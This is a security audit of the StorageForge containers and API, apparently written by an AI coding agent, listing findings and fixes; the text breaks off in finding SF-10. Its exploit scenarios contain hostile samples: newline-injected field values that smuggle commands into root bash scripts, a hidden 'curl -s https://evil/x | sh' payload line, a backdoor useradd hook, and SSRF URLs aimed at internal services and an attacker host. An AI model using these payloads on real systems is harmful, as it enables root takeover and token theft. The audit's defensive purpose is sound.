---
title: StorageForge Security Audit — Containers & API
date: 2026-10-28
version_audited: 0.2.0 (working tree on master, uncommitted changes included)
auditor: Claude Code (static review + targeted local reproduction)
scope: [Dockerfile, docker-compose.yml, docker/entrypoint.sh, docker/init-secrets.sh, server.py, users.py, alerts.py, jobs.py, deploy.py, moves.py, changes.py, shares.py, tasks.py, keyinstall.py]
tags: [security, audit, docker, api, hardening]
related: ["[[security-parm]]", "[[audit-results]]", "[[audit-2026-10-27]]", "[[deployments-design]]"]
---

# StorageForge Security Audit — 2026-10-28

> [!abstract] How to read this note
> Every finding says **why** it is insecure: what the code assumes, how an attacker breaks the assumption, and what it costs you. Every control marked ✅ also says **why** it holds up, so you know what not to undo during refactors. File references are relative to `storageforge-indexer/`.

> [!success] Remediation status (2026-10-28, same day)
> - **SF-01 fixed.** Hosts in move steps, change tasks and share mounts must be host names or addresses (`scriptkit.host_name`). Notes are flattened to one line. Every `#` header line in the move, change, Ansible, share and task scripts goes through `scriptkit.comments()`, which turns line breaks and terminal control characters into spaces. Tests: `ScriptHeaderTests`.
> - **SF-02 mitigated (owner's call: full power per account stays, by design).** Anything that runs commands on hosts now needs the password typed within the last 5 minutes: deploy start, job run/verify/pause/resume/cutover, restore, key install, scan-access grant, deploy access and adopt. The UI prompts for it and retries the request. Read-only job actions (dry run, log, snapshots) don't prompt. Roles and TOTP were not added.
> - **SF-03 fixed.** Sessions end 30 minutes after sign-in (was 12 h); each user can raise their own to 8 h in the header's Session menu (changing it needs the password). Sessions are also stored server-side (`web_sessions`, hashed ids): logout kills copied cookies, and `storageforge-index user signout <name>` ends every session of an account.
> - **SF-06 fixed for the LAN.** Compose now puts an unprivileged, read-only nginx with a self-signed certificate (`init-secrets.sh`) on port 8443. Plain HTTP stays on the compose network. The cookie is `Secure` and named `__Host-sf_session`, with HSTS. Deployed jobs pin that certificate (`/etc/storageforge/report-ca.pem`) when they report to an https report URL. Not intended for internet exposure.
> - **SF-04 fixed.** Alert URLs may not resolve to loopback, link-local (cloud metadata), unspecified, multicast or reserved addresses, checked at save and before each send. Private LAN ranges stay allowed, because a self-hosted ntfy is the normal case. Redirects are not followed. The test button reports only HTTP status codes or "could not deliver". A stored ntfy/Gotify token is dropped when its server's host changes. Residual: DNS rebinding between check and connect.
> - **SF-05 fixed.** Numeric query args are clamped (`arg_num`), and NaN/inf are rejected.
> - **SF-07 fixed.** The per-account limit is keyed on account + client /24 (or /64), with a 100/day per-account backstop. Limit hits are audited (`web.login.limited`).
> - **SF-08 fixed.** `/healthz` is `{"status"}` only, except for the in-container healthcheck and signed-in users. `Server: StorageForge` carries no version.
> - **SF-09 fixed.** The base image is pinned by digest. Dependencies are installed with `--require-hashes` from `docker/requirements*.lock`, generated with a 14-day `--exclude-newer` cutoff. The runtime image has no pip, ensurepip or setuptools. Trivy in CI is not set up (there is no CI).
> - **SF-10 fixed differently.** Secret files are `0640` with the owner's group, read by the containers through `group_add`, so other host users can't read them even if `secrets/` is loosened. `secrets/api_token` was **not** deleted: nothing in the code uses it, but whether anything outside does is the owner's call.
> - **SF-11 fixed.** Every subprocess (ssh, ssh-agent, local shells) gets the environment without `STORAGEFORGE_*`.
> - **SF-12 fixed (opt-in).** `docker/egress-firewall.sh` (root) limits traffic out of `sf0` to DNS, SSH and alert ports. The demo runs as its own compose project, with its own volumes, bridge and port, and the target sits on an `internal` network.
> - **SF-13.** Snapshot browse is now POST. Job reports record the sender's address and reject run times dated ahead. Accepted as-is: logout without a CSRF token (SameSite=Strict), library `ValueError` text in 400s (signed-in users only), `style-src-attr 'unsafe-inline'`.
> - **SF-02 roles / TOTP / separate signer: not done.** The owner considers full power per account inherent to this tool. The password re-check covers the command paths.
> - Verified end to end on an isolated compose stack (TLS, pinned cert, `__Host-` cookie, re-auth, clamps, logout revocation, group-read secrets, no pip in the image). The full test suite passes in the Dockerfile `test` stage.

---

## 1. Executive Summary

### Overall risk posture: **Moderate — good container baseline, one confirmed injection bug, and a flat trust model with a large blast radius**

StorageForge is a single-tenant admin tool. Its web UI holds an SSH key vault and a **signing key that can run any script as root on every enrolled host**. So the real question is not "can user A read user B's data" (there are no per-user objects). It is: **how hard is it to become *any* signed-in user, or to slip a command into something a signed-in user will run as root?**

- **Container hardening is strong.** The container runs non-root with a read-only root filesystem, `cap_drop: ALL`, `no-new-privileges`, tmpfs runtime dirs, a loopback-only port, and file-based secrets. The entrypoint refuses to start as root. Only supply-chain pinning and some file-permission details are missing.
- **API authentication coverage is complete.** Every `/api/*` route except `/api/login`, `/api/logout`, `/healthz` and the bearer-token `/api/jobs/report` has `@login_required`. SQL is parameterized, and passwords use scrypt with timing-equal misses.

### High-severity issues

| ID | Title | Severity |
|---|---|---|
| [[#SF-01 — Shell injection into root scripts via newline in host / note fields\|SF-01]] | Newlines in a move step's host or note, or in a change task's host, become executable lines in generated root bash scripts. **Reproduced locally.** | 🔴 High |
| [[#SF-02 — Flat authorization: every account is root on every enrolled host\|SF-02]] | Every account has full power: deploys as root, pre/post hook commands, key install. There are no roles, no MFA, and no re-authentication before root-level actions. | 🔴 High |

### Immediate remediation roadmap

1. **Today:** validate `host` in `moves.normalize` and `changes.normalize` the same way `tasks.normalize` already does, and strip CR/LF from every value written into a `#` comment line (SF-01).
2. **This week:** clamp `limit` parameters (SF-05). Revoke sessions server-side on logout (SF-03). Block private and loopback targets for alert URLs (SF-04).
3. **Next release:** add re-authentication (and optional TOTP) before deploy/apply, key install and access grant. Add a read-only role (SF-02). Pin the base image digest and dependency hashes (SF-09).

---

## 2. Container Hardening Analysis

### 2.1 What is done right (keep these)

| Control | Where | ✅ Why it is secure |
|---|---|---|
| Non-root user `10001:10001` | `Dockerfile` `USER 10001:10001`; compose `user:` | A process exploited through Flask, waitress or ssh gets an unprivileged UID. It cannot write system paths or load kernel modules, and any container escape starts without root inside the container. Setting the user in **both** places means a compose override that drops one still leaves the other. |
| Entrypoint refuses root | `docker/entrypoint.sh` step 1 | A `docker run --user 0` mistake fails loudly instead of quietly running the vault as root. |
| `read_only: true` | compose | An attacker with code execution cannot drop a persistent binary, change `/opt/venv` Python files (backdooring the app on next start) or edit `/etc`. Writes are confined to the data volume and tmpfs mounts. |
| `cap_drop: [ALL]`, no `cap_add` | compose | The default Docker capability set includes `NET_RAW` (ARP/packet spoofing on the bridge), `CHOWN`, `DAC_OVERRIDE`, `SETUID` and others. The app needs none of them. With no capabilities, even a root shell inside the container can do very little. |
| `no-new-privileges:true` | compose | setuid binaries (and file capabilities) in the image cannot raise privileges. This closes the classic "exploit as app user → run a setuid helper" path. |
| tmpfs `/run/storageforge` (`noexec,nosuid,nodev,0700`) and `/tmp` | compose; entrypoint checks `fstype` | Decrypted SSH keys only exist in ssh-agent memory and its socket here. They never reach a disk that could be imaged or backed up. `noexec` stops payloads staged in writable dirs from being run directly. |
| Port published on `127.0.0.1` only | compose `ports` | Nothing outside the host can reach the plaintext HTTP listener. A TLS proxy is forced to be the only way in. |
| Compose `secrets:` and `*_FILE` variables | compose, `vault.py:152`, `server.py:129` | Secrets never appear in `docker inspect`, `/proc/<pid>/environ` or image layers, and are not inherited by child processes as environment variables. |
| Multi-stage build; pip removed from venv; `--no-install-recommends`; apt lists deleted | `Dockerfile` | Compilers, build caches and the venv's pip stay out of the runtime image. Fewer tools means less for an attacker to live off. |
| `ssh-keyscan`, `scp`, `sftp` deleted | `Dockerfile` | Removes easy file-transfer and reconnaissance tools that the app does not need. |
| `tini` as PID 1 | `Dockerfile` | Reaps zombie ssh/agent processes and forwards signals, so ephemeral agents with decrypted keys are not left behind as orphans. |
| `pids: 256`, memory/CPU limits, `nofile` ulimit | compose | Fork bombs and runaway scans hit a ceiling inside the cgroup instead of exhausting the host. |
| `.dockerignore` excludes `secrets/`, `keys/`, `*.db` | `.dockerignore` | A `docker build` cannot bake the vault secret or the database into an image layer that might get pushed to a registry. |
| No Docker socket mounted | compose | Mounting `/var/run/docker.sock` would equal host root. The Docker inventory feature collects data over SSH instead. |

### 2.2 Gaps

| Gap | Finding |
|---|---|
| Base image tag and Python deps not pinned to digests or hashes | [[#SF-09 — Unpinned base image and dependencies; system pip left in runtime\|SF-09]] |
| Secret files are `0644` on the host; stale `secrets/api_token` | [[#SF-10 — Host secret files world-readable (mitigated by 0700 dir); stale token file\|SF-10]] |
| ssh children inherit the full environment | [[#SF-11 — SSH subprocesses inherit the full process environment\|SF-11]] |
| Flat network with unrestricted egress; demo target shares it | [[#SF-12 — Unrestricted egress and a flat bridge network\|SF-12]] |
| `STORAGEFORGE_COOKIE_SECURE` defaults to `0` | [[#SF-06 — Secure cookie flag off by default; no HSTS\|SF-06]] |
| `memlock` ulimit raised | Intentional, so the vault can `mlock()` key buffers and keep them out of swap. **Why it's acceptable:** 16 MiB of locked memory per container cannot starve the host, and keeping keys out of swap is worth more. |

### 2.3 Volumes and mounts

| Mount | Mode | Assessment |
|---|---|---|
| `sf-data:/app/data` | rw | Required. The entrypoint enforces owner UID and `0700`/`0600` modes. **Why that matters:** the DB holds wrapped keys and the audit chain, and a world-readable DB would expose them to other UIDs inside the container. |
| `sf-backups:/app/backups` | rw | Backups contain the vault ciphertext. They are encrypted, but the README says to copy them off-host. Off-host copies should stay encrypted at rest too: the KEK comes only from `vault_secret`, so whoever holds a backup **and** that secret holds every key. |
| `/etc/localtime` | ro | Harmless. |
| `./keys:/run/secrets/ssh-import` | ro | **Why `:ro` matters:** the entrypoint imports every file here as a key. A writable mount would let a compromised container plant files for the next import. The entrypoint even probes and warns if it is writable. ✅ |

---

## 3. API Security Assessment

### 3.1 Authentication boundary

| Route | Auth | Assessment |
|---|---|---|
| `GET /`, `/planner`, static allow-list | none | ✅ Static files from a fixed `<any(...)>` allow-list. **Why it's safe:** no user-controlled path ever reaches `send_from_directory`, so traversal is impossible. |
| `GET /healthz` | none | ⚠️ Leaks user count and vault state — [[#SF-08 — Unauthenticated /healthz and Server header disclose internals\|SF-08]] |
| `POST /api/login` | none, rate-limited | ✅ / ⚠️ see [[#SF-07 — Per-username login limit enables targeted account lockout\|SF-07]] |
| `POST /api/logout` | none | ⚠️ does not revoke the cookie — [[#SF-03 — Logout does not revoke the session cookie\|SF-03]] |
| `POST /api/jobs/report` | Bearer job token | ✅ The token is 256-bit random (`secrets.token_urlsafe(32)`) and only its SHA-256 is stored (`jobs.py:336`). The token must match the `job` in the body (`server.py:977`), and the body is capped at 4 KiB. **Why it's secure:** a DB leak exposes no usable tokens, and a token cannot report for another job. |
| every other `/api/*` | `@login_required` | ✅ Checked route by route in `server.py:431-1097`. No route is missing the decorator. |

### 3.2 Object-level authorization (BOLA / IDOR)

StorageForge has **no per-user ownership**. Plans (`/api/moves/<id>`, `/api/changes/<id>`, `/api/tasks/<id>`), deployed jobs (`/api/deploy/jobs/<jid>`) and designs are global objects. Any signed-in user can read, edit, delete or deploy any of them.

- **Why this isn't a classic IDOR:** there is no ownership boundary to bypass. Integer IDs are fine because every user is meant to see every object.
- **Why it still matters:** the authorization model is "authenticated = full admin". Every BOLA question reduces to [[#SF-02 — Flat authorization: every account is root on every enrolled host|SF-02]]. If you ever add a second, less-trusted account (for example a viewer for a family member or colleague), you need roles first.
- ✅ Path parameters are typed or validated before use: `<int:plan_id>`, `JOB_RE` on job IDs (`jobs.py:406`), a 32-hex regex on group IDs (`server.py:908`), and a verb allow-list via `<any(...)>`. **Why this matters:** `jid` is interpolated into shell commands (`jobs.py:395-403`), and the regex is the only thing stopping injection there.

### 3.3 CSRF / CORS

- ✅ State-changing routes require `application/json` (`json_body()`, `server.py:366`), and **no CORS headers are ever sent**. **Why it's secure:** a cross-site page can only send "simple" requests (form-encoded, `text/plain`). A JSON content type or a `PUT`/`DELETE` method triggers a CORS preflight, which the browser fails. Independently, `SameSite=Strict` stops the browser from attaching `sf_session` to any cross-site request at all, so there are two layers.
- ℹ️ `DELETE /api/shares` reads only query args, but `DELETE` is never a simple method, so preflight still protects it.
- ℹ️ Some `GET`s have side effects: `/api/deploy/jobs/<jid>/browse` runs a signed command on a host, and the script downloads write audit entries. `SameSite=Strict` covers this, but GETs should be safe by convention. If cookies are ever relaxed to `Lax`, a top-level cross-site link would carry the cookie on these GETs.

### 3.4 Input validation

| Area | Status | Why |
|---|---|---|
| Body size | ✅ 4 KiB global, 2 MiB for planner `PUT` | Oversized-JSON memory exhaustion is bounded before parsing. |
| SQL | ✅ parameterized everywhere; `f"""` SQL interpolates only fixed fragments (sampled: `deploy.py:495`, `alerts.py:227`, `fsmap.py:129`, `db.py`) | User values never become SQL syntax. |
| Paths into scripts | ✅ `moves._path` rejects `..`, NUL, `\n`; values pass through `shlex.quote` into bash arrays | Quoting makes each value a single literal word, and newline rejection keeps the values on one line. |
| **Hosts and notes in moves and change plans** | ❌ not validated | → [[#SF-01 — Shell injection into root scripts via newline in host / note fields\|SF-01]] |
| Task host | ✅ `tasks.normalize` rejects non-hostnames (`tasks.py:221-223`, confirmed by test) | The pattern to copy for SF-01. |
| SSH target fields | ✅ `keyinstall.validate` (`HOST`, `USER` regexes, no leading `-`) | Blocks option injection such as `-oProxyCommand=…` into `ssh`/`ssh-copy-id` argv. |
| Pagination `limit` | ❌ negative values accepted | → [[#SF-05 — Negative limit bypasses result caps (full-table dumps / DoS)\|SF-05]] |
| Outbound URLs | ⚠️ scheme-only check | → [[#SF-04 — SSRF through alert channel URLs with an error oracle\|SF-04]] |
| Mass assignment | ✅ normalizers build new dicts field by field from allow-lists | Unknown keys in the body are dropped, so clients cannot set `id`, `created_by` and similar fields. |

### 3.5 Rate limiting

✅ Login is limited per IP (10/min, 50/h) and per username (5/min, 20/h), and only **failed** attempts count (`deduct_when=failed`). Key install, access grant and deploy access (each one is a password try against a *target host*) allow 10/min per user. Backups allow 6/h, and the test alert 10/min.
- **Why it's good:** an online password guess costs an attacker about 20 tries/hour/account, and successful sign-ins never lock a legitimate user out.
- **Caveats:** the limits live in `memory://`, so they reset on restart (fine for a single process). Per-username limits allow targeted lockout ([[#SF-07 — Per-username login limit enables targeted account lockout|SF-07]]). Behind a proxy you **must** set `STORAGEFORGE_PROXY_HOPS=1`. Otherwise every client shares the proxy's IP, and one attacker can trip the per-IP limit for everyone.

### 3.6 Flask session and error handling

| Item | Status | Why |
|---|---|---|
| `HttpOnly` | ✅ | JavaScript (including any XSS) cannot read `sf_session`, which blocks cookie theft through script. |
| `SameSite=Strict` | ✅ | See §3.3. |
| `Secure` | ⚠️ off by default | [[#SF-06 — Secure cookie flag off by default; no HSTS\|SF-06]] |
| Lifetime | ✅ 12 h absolute | Flask checks `max_age=PERMANENT_SESSION_LIFETIME` on every load, and non-permanent sessions are not re-signed per request. A stolen cookie therefore dies 12 h after login. |
| `session_protection='strong'` | ✅ | Flask-Login binds the session to a hash of IP and User-Agent. A cookie replayed from a different network is dropped. (Behind a proxy without `PROXY_HOPS`, every client has the same IP, which weakens this.) |
| Session fixation | ✅ N/A | Sessions are client-side signed cookies with no server-side ID to fix, and `login_user` writes a fresh identity. |
| Revocation | ⚠️ only on password change or disable (`session_version`) | [[#SF-03 — Logout does not revoke the session cookie\|SF-03]] |
| Debug / tracebacks | ✅ | The app is served by waitress, not `app.run(debug=True)`. Unhandled errors return only `internal error: <ExceptionType>` (`server.py:361`), with the traceback going to stderr. **Why it matters:** no file paths, SQL or locals reach the client. |
| Error text pass-through | ℹ️ | `ValueError`, `VaultError`, `RemoteError` and `InstallError` messages are returned verbatim. They are mostly authored strings. A `ValueError` raised deep inside a library would leak its message, but only to signed-in users. |
| Security headers | ✅ strict CSP (`script-src 'self'`, `frame-ancestors 'none'`, `base-uri 'none'`), `nosniff`, `no-referrer`, `DENY`, COOP, `no-store` | Without inline scripts, an HTML-injection bug cannot become script execution. `no-store` keeps API responses (keys, audit data) out of browser and proxy caches. `style-src-attr 'unsafe-inline'` is a small, accepted gap: style attributes allow CSS-only tricks, not script. |

---

## 4. Detailed Findings Register

### SF-01 — Shell injection into root scripts via newline in host / note fields

| | |
|---|---|
| **Severity** | 🔴 High |
| **Component** | `storageforge_index/moves.py:96-98, 420`; `storageforge_index/changes.py:121-123, 149, 564-565` |
| **Status** | **Confirmed** by local reproduction |

**Technical description.** The generated scripts quote every *value* with `shlex.quote` and put it in a bash array. The script header is different: it lists the plan as `#`-prefixed comment lines built by plain f-string interpolation:

```python
# moves.py:420
summary.append(f'#   {len(summary) + 1}. {vals["S_DESC"]}' + ... + (f'  [{s["note"]}]' if s['note'] else ''))
# changes.py:564
summary.append(f'#   {i:>2}. [{t["host"]}] {title(t)}' ...)
```

`S_DESC` includes `src.host` and `dst.host`. `normalize()` only `.strip()`s these and `note` (`moves.py:96-98`, `changes.py:121, 149`). It never rejects line breaks.

**Why this is insecure.** A comment only lasts until the end of its line. One `\n` inside the value ends the comment, and whatever follows is a **new bash command at the top of a script meant to run as root**. Quoting the values in the body does not help, because the header bypasses quoting entirely. The same text also reaches the "problems" comment block through check messages such as `source host … has not been scanned`.

Reproduction (scratch DB):

```text
note = "n\nid > /tmp/owned"
→ script line 1:  #   1. copy a:/srv -> b:/d  [n
→ script line 2:  id > /tmp/owned]          ← executed

change task host = "h1\nid > /tmp/owned2 #"
→ id > /tmp/owned2 #] Create folder /srv/new   ← executed
→ id > /tmp/owned2 # has not been scanned      ← executed again
```

**Exploit scenario.**
1. An attacker gets *any* web session (a phished password, a cookie from an unlocked laptop, or one of the other findings). Alternatively, a co-admin crafts the plan directly.
2. They edit an existing, trusted move plan and add a long note whose second line is `curl -s https://evil/x | sh`. The UI shows it as a harmless note.
3. The owner downloads the script, reads the first screen of the *body* (all values quoted), and runs it with `sudo bash plan.sh`. The payload runs as root before any step.

The downloaded script is a human-reviewed artifact, and this bug lets a payload hide in the part reviewers skim, which is what makes it worse than SF-02's "users can already add hooks". Any future feature that renders these headers into signed deploys inherits the bug.

**Remediation.**

```python
# moves.py — reuse the SSH host rule (keyinstall.HOST) like tasks.normalize already does
from .keyinstall import HOST as HOST_RE

def _host(h, what) -> str:
    h = str(h or '').strip()
    if not HOST_RE.fullmatch(h) or h.startswith('-'):
        raise ValueError(f'{what} must be a host name or address')
    return h

# in normalize():
'src': {'host': _host(src.get('host'), f'step {i} source host'), 'path': _path(...)},
'dst': {'host': _host(dst.get('host'), f'step {i} destination host'), 'path': _path(...)},
'note': ' '.join(str(s.get('note') or '').split())[:300],      # collapses \r \n \t
```

```python
# changes.py normalize()
host = _host(t.get('host'), f'task {i} host')                    # same helper
... 'note': ' '.join(str(t.get('note') or '').split())[:300]
```

Defense in depth: route **every** string written into a comment through one helper, so a future field cannot reintroduce the bug.

```python
def comment(text: str) -> str:
    return ' '.join(str(text).split())        # no CR/LF/VT/FF survives
summary.append(f'#   {n}. {comment(vals["S_DESC"])}' ...)
problems = [f'#   step {st["step"]}: {it["level"].upper()}: {comment(it["text"])}' ...]
```

Add a regression test that saves a plan with `'\n'` in host and note, and asserts `script()` contains no line that does not start with `#` before `set -euo pipefail`. Apply the same audit to `tasks.py:593-594` (block notes and labels) and `shares.py:402`.

---

### SF-02 — Flat authorization: every account is root on every enrolled host

| | |
|---|---|
| **Severity** | 🔴 High (by design, but the impact is the whole fleet) |
| **Component** | `server.py` (all routes), `deploy.py`, `moves.py:89-94` (pre/post hooks), `users.py` |

**Technical description.** There is one role. Any signed-in user can:
- `POST /api/deploy/start` with `mode: apply`. The server signs the script with the vault's `storageforge-signing` key, and every enrolled host runs it as root (`deploy.py` docstring).
- Save move steps with arbitrary `pre`/`post` shell commands (`moves.py:89-94`), which deployed jobs run as root on the host.
- Generate and install SSH keys, grant scan access with sudo, change alert destinations, and restore snapshots.

There is no MFA and no re-authentication before these actions.

**Why this is insecure.** The deploy design is careful: signatures, nonces, a 10-minute window, and a forced-command runner. That design makes sure **only StorageForge** can run root scripts on hosts. Who gets to tell StorageForge what to sign comes down to **one password and one cookie**. So the security of every enrolled host equals the security of the weakest account's password and of every browser that ever held a session. Defense in depth is missing at exactly the most valuable point. The signing key also lives in the same process as the web app, so any RCE in Flask or a dependency can sign arbitrary scripts too.

**Exploit scenario.** An admin signs in from a shared machine and walks away. Anyone at the keyboard (or any malware there) opens Deploy → Changes → apply, or adds a `post` hook `useradd -o -u0 backdoor…`, and owns every server within one deploy cycle. Nothing asks for the password again.

**Remediation.**
1. **Step-up re-authentication** for root-level actions: deploy `apply`, job `run`/`cutover`/`restore`, key generate/install, access/deploy grant, and alert settings. Require a recent password (or TOTP) check.

```python
REAUTH_WINDOW = 300
def recent_auth():
    if time.time() - session.get('auth_at', 0) > REAUTH_WINDOW:
        abort(403, description='confirm your password to continue')

@web.post('/api/reauth')
@login_required
@limiter.limit(LOGIN_LIMIT_PER_USER, key_func=lambda: f'reauth:{current_user.get_id()}')
def api_reauth():
    if not users.authenticate(conn(), current_user.username, str(json_body().get('password', ''))):
        return jsonify(error='wrong password'), 401
    session['auth_at'] = time.time()
    return jsonify(ok=True)
# login: session['auth_at'] = time.time()
# api_deploy_start (mode == 'apply'), api_key_*, api_access_grant, api_deploy_access, job actions, restore: recent_auth()
```

2. **Optional TOTP** (`pyotp`) per user. Enforce it when `deploy.ready()` is true for any host.
3. **Roles:** a `role` column (`viewer`, `planner`, `admin`) and a decorator `@requires('admin')` on deploy, key and access routes. Viewers get GETs only.
4. Longer term: move signing into a separate process (or onto a hardware key) and send it signing requests over a local socket, so web-tier RCE does not automatically mean signing-key access.

---

### SF-03 — Logout does not revoke the session cookie

| | |
|---|---|
| **Severity** | 🟠 Medium |
| **Component** | `server.py:426-429`, `users.py:28-41` |

**Technical description.** Sessions are Flask's client-side signed cookies. `logout_user()` only tells the browser to drop *its* copy. The server keeps no record of the session, and `users.load()` accepts any cookie whose `user_id:session_version` still matches. `session_version` only changes on password change or disable.

**Why this is insecure.** Logout gives a false sense of safety. A cookie copied before logout (by malware, a proxy log, a cookie-syncing extension, or an HTTP-only deployment sniffed on the LAN, see SF-06) **keeps working for up to 12 h** after the user clicks "Sign out". Given SF-02, that is 12 h of root-on-the-fleet.

**Exploit scenario.** An attacker grabs `sf_session` from an unencrypted Wi-Fi session. The admin notices something odd and signs out, assuming the attacker is cut off, but the replayed cookie still works.

**Remediation (simplest):** make logout invalidate every session of that user, which is acceptable for a small admin tool.

```python
@web.post('/api/logout')
@login_required
def api_logout():
    conn().execute('UPDATE users SET session_version = session_version + 1 WHERE user_id = :u',
                   {'u': current_user.user_id})
    core.audit(conn(), actor(), 'web.logout', 'ok', None, {})
    logout_user()
    return jsonify(ok=True)
```

Better: store a random per-login `sid` in a `web_sessions` table, put it in the cookie, check it in `load_user`, delete it on logout, and offer "sign out everywhere" plus an idle timeout (for example 30 min without activity, tracked in the row).

---

### SF-04 — SSRF through alert channel URLs with an error oracle

| | |
|---|---|
| **Severity** | 🟠 Medium |
| **Component** | `alerts.py:19, 47-62, 67-103`; `server.py:961-966` |

**Technical description.** `save_settings` only checks that ntfy/gotify/webhook URLs match `https?://…`. `_post()` uses `urllib.request.urlopen`, which **follows redirects** and resolves any host, including `127.0.0.1`, `169.254.169.254`, RFC 1918 addresses and the Docker bridge gateway. `POST /api/deploy/settings/test` returns the exception text for each channel (`out.append(f'webhook: {exc}')`).

**Why this is insecure.** The server can reach places the user's browser cannot: its own loopback, the Docker host, other containers, and the LAN behind the host firewall (`sf0` is explicitly allowed to reach host port 22). Error messages such as `Connection refused` versus `timed out` versus `HTTP Error 404` turn the test button into a **port scanner and service fingerprinter** for the internal network. The request body is attacker-influenced JSON, and the ntfy/gotify tokens ride along in headers. An attacker who points `gotify.url` at their own server while a token is stored also captures that token: the UI hides it (`'••••••'`), but the server still sends it.

**Exploit scenario.** With a session, the attacker sets the webhook to `http://172.18.0.1:2375/containers/create` (an exposed Docker API on the host) or loops through `http://10.0.0.x:port/`. They press "Send test" ten times a minute and read which ports answer. Or they swap the gotify URL to `https://attacker` and press test to receive `X-Gotify-Key`.

**Remediation.**

```python
import ipaddress, socket, urllib.request

class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None
_opener = urllib.request.build_opener(_NoRedirect)

def _public(url: str):
    host = urllib.parse.urlsplit(url).hostname or ''
    for *_, sa in socket.getaddrinfo(host, None):
        ip = ipaddress.ip_address(sa[0])
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved or ip.is_multicast:
            if not ALLOW_PRIVATE_ALERTS:   # env opt-in for self-hosted ntfy on the LAN
                raise ValueError('alert URLs must be public (set STORAGEFORGE_ALERTS_ALLOW_PRIVATE=1 for a LAN server)')

def _post(url, data, headers):
    _public(url)
    req = urllib.request.Request(url, data=data, headers={'User-Agent': 'StorageForge', **headers}, method='POST')
    with _opener.open(req, timeout=15) as r:
        r.read(1000)

# send(): report a generic reason instead of str(exc)
except Exception as exc:
    out.append(f'webhook: failed ({type(exc).__name__})')
```

Also: when a channel's URL **host** changes, clear its stored token unless a new one comes in the same request, so a token cannot be redirected to a new destination. Require re-auth on `PUT /api/deploy/settings` (SF-02).

---

### SF-05 — Negative `limit` bypasses result caps (full-table dumps / DoS)

| | |
|---|---|
| **Severity** | 🟠 Medium |
| **Component** | `server.py:469` (`/api/search`), `server.py:485` (`/api/audit`), `server.py:915` (`/api/deploy/runs`, no cap at all) |

**Technical description.** The caps are `min(int(x), 500)` and `min(int(x), 1000)`. `min(-1, 500)` is `-1`, and in SQLite `LIMIT -1` means **no limit**. `/api/deploy/runs` passes `int(limit)` straight through.

**Why this is insecure.** The caps exist because the index can hold millions of rows (the compose file mentions a 6M-file index that hit 1 GiB). One `GET /api/search?q=*&limit=-1` makes the server build and JSON-serialize every match in memory. That can hit the 2 GiB container limit and get the process OOM-killed. The OOM kill takes the scan worker with it and marks running jobs failed. It is an authenticated DoS, but cheap and repeatable. `/api/audit?limit=-1` also dumps the entire audit log in one response.

**Remediation.**

```python
def clamp(v, default, hi):
    try:
        return max(1, min(int(v or default), hi))
    except ValueError:
        raise ValueError('limit must be a number')

limit=clamp(q.get('limit'), 100, 500)                          # /api/search
limit = clamp(request.args.get('limit'), 100, 1000)            # /api/audit
deploy.history(conn(), host, clamp(request.args.get('limit'), 50, 500))
```

Also clamp `years` in `/api/folders/cold` with `math.isfinite`.

---

### SF-06 — Secure cookie flag off by default; no HSTS

| | |
|---|---|
| **Severity** | 🟠 Medium (deployment-dependent) |
| **Component** | `docker-compose.yml` (`STORAGEFORGE_COOKIE_SECURE:-0`), `server.py:313` |

**Why this is insecure.** Without `Secure`, the browser sends `sf_session` over plain `http://` too. If the reverse proxy also listens on port 80, or a user ever types `http://storageforge.lan`, the cookie crosses the network in cleartext before any redirect happens, and anyone on the LAN or Wi-Fi can replay it (made worse by SF-03). A default that needs a manual change to be safe will stay unsafe in some installs.

**Remediation.**
- Default `STORAGEFORGE_COOKIE_SECURE=1` in compose, and let local-only use opt out (`0`), rather than the other way round.
- Better: derive it from the request. With `ProxyFix(x_proto=1)`, set `SESSION_COOKIE_SECURE=True` and refuse to log in when `request.scheme != 'https'`, unless `remote_addr` is loopback.
- Name the cookie `__Host-sf_session`. Browsers then refuse to set it without `Secure` and `Path=/` and without a `Domain`, so a sibling subdomain cannot overwrite it.
- Send `Strict-Transport-Security: max-age=31536000` when the scheme is https (or document it for the proxy).

---

### SF-07 — Per-username login limit enables targeted account lockout

| | |
|---|---|
| **Severity** | 🟡 Low |
| **Component** | `server.py:123-124, 404-415` |

**Why this is insecure.** The per-username key (`user:<name>`) counts failures from **any** IP. Someone who knows or guesses `admin` can send 5 bad passwords a minute and keep the real admin locked out (429) indefinitely, during an incident, for example. The intent (slowing distributed guessing) is right. The side effect is a cheap denial of access.

**Remediation.** Key the per-user limit on `(username, client /24 or /64)`, or exempt clients that present a valid long-lived "known device" cookie set after a past successful login. Keep a looser global per-user limit (for example 100/day) as the distributed-guessing backstop. Alert on per-user limit hits.

---

### SF-08 — Unauthenticated `/healthz` and `Server` header disclose internals

| | |
|---|---|
| **Severity** | 🟡 Low |
| **Component** | `server.py:348, 389-402` |

**Why this is insecure.** `/healthz` tells anyone the exact version, whether the vault is initialised, and how many active users exist (`users: 1` says one account is worth brute-forcing; `users: 0` says the instance is fresh). The `Server: StorageForge/0.2.0` header repeats the version on every response. That lets an attacker match the instance against known bugs before authenticating.

**Remediation.** Return only `{"status": "ok"}` (and 503 on failure) to unauthenticated callers. Give the detailed checks only to signed-in users or to requests from `127.0.0.1` (the Docker `HEALTHCHECK` runs inside the container, so the CLI `healthcheck` can keep full detail). Drop the version from `Server`.

---

### SF-09 — Unpinned base image and dependencies; system pip left in runtime

| | |
|---|---|
| **Severity** | 🟡 Low |
| **Component** | `Dockerfile:5`, `pyproject.toml` dependencies |

**Why this is insecure.** `python:3.13-slim-bookworm` is a moving tag, and `flask>=3.1`-style ranges resolve to whatever is newest at build time. Two builds of the same commit can differ, and a compromised or buggy upstream release flows straight into an image that holds an SSH-key vault. The build also cannot be audited after the fact, because nothing records which versions went in. The base image's own `/usr/local/bin/pip` is still in the runtime stage (only the venv's pip is removed), which gives an attacker with code execution an installer.

**Remediation.**

```dockerfile
ARG PYTHON_IMAGE=python:3.13-slim-bookworm@sha256:<digest>
# build stage
COPY requirements.lock ./
RUN /opt/venv/bin/pip install --require-hashes -r requirements.lock && /opt/venv/bin/pip install --no-deps .
# runtime stage, after apt
RUN rm -rf /usr/local/lib/python3.13/site-packages/pip /usr/local/bin/pip*
```

Generate `requirements.lock` with `pip-compile --generate-hashes`. Let Dependabot or Renovate bump the digest, and scan images in CI (`trivy image storageforge:0.2.0`).

---

### SF-10 — Host secret files world-readable (mitigated by 0700 dir); stale token file

| | |
|---|---|
| **Severity** | 🟡 Low |
| **Component** | `docker/init-secrets.sh` (`chmod 0644`), `secrets/api_token` |

